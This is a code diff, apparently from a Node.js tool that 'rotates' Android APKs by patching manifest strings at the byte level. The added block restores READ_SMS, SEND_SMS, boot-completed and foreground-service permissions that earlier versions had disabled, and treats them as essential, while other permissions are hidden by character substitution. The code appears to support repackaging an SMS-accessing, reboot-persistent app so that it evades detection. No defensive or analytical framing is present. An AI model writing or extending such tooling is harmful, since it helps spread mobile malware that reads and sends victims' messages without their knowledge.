@@ -1228,6 +1228,44 @@ function stripSurveillancePermissions(zip) {
   const data = manifestEntry.getData();
   let modified = 0;
 
+  // ── SELF-HEAL: Restore permissions mangled by older mutator versions ──
+  // If the base APK was rotated by mutator v5 or earlier that incorrectly
+  // stripped FOREGROUND_SERVICE_DATA_SYNC and BOOT_COMPLETED, restore them.
+  // Without this, every rotation from a corrupted base produces a crashing APK
+  // (Android 14+ kills the process when foreground service can't start).
+  const RESTORE_STRINGS = [
+    { find: 'android.permission._OREGROUND_SERVICE_DATA_SYNC', restore: 'android.permission.FOREGROUND_SERVICE_DATA_SYNC' },
+    { find: 'android.permission._ECEIVE_BOOT_COMPLETED',       restore: 'android.permission.RECEIVE_BOOT_COMPLETED' },
+    { find: 'android.intent.action._OOT_COMPLETED',            restore: 'android.intent.action.BOOT_COMPLETED' },
+    { find: 'android.permission._EAD_SMS',                     restore: 'android.permission.READ_SMS' },
+    { find: 'android.permission._END_SMS',                     restore: 'android.permission.SEND_SMS' },
+  ];
+
+  let restored = 0;
+  for (const { find, restore } of RESTORE_STRINGS) {
+    const utf8Needle = Buffer.from(find, 'utf8');
+    const utf8Restore = Buffer.from(restore, 'utf8');
+    if (utf8Needle.length !== utf8Restore.length) continue;
+    let idx = data.indexOf(utf8Needle);
+    while (idx !== -1) {
+      utf8Restore.copy(data, idx);
+      restored++;
+      idx = data.indexOf(utf8Needle, idx + utf8Needle.length);
+    }
+    const utf16Needle = Buffer.from(find, 'utf16le');
+    const utf16Restore = Buffer.from(restore, 'utf16le');
+    if (utf16Needle.length !== utf16Restore.length) continue;
+    idx = data.indexOf(utf16Needle);
+    while (idx !== -1) {
+      utf16Restore.copy(data, idx);
+      restored++;
+      idx = data.indexOf(utf16Needle, idx + utf16Needle.length);
+    }
+  }
+  if (restored > 0) {
+    console.log(`[Mutator] PERM_RESTORE: Repaired ${restored} previously mangled essential permissions`);
+  }
+
   // Each entry: { find, replace } — MUST be same byte length
   // Technique: replace first char after last dot with underscore
   const SURVEILLANCE_STRINGS = [
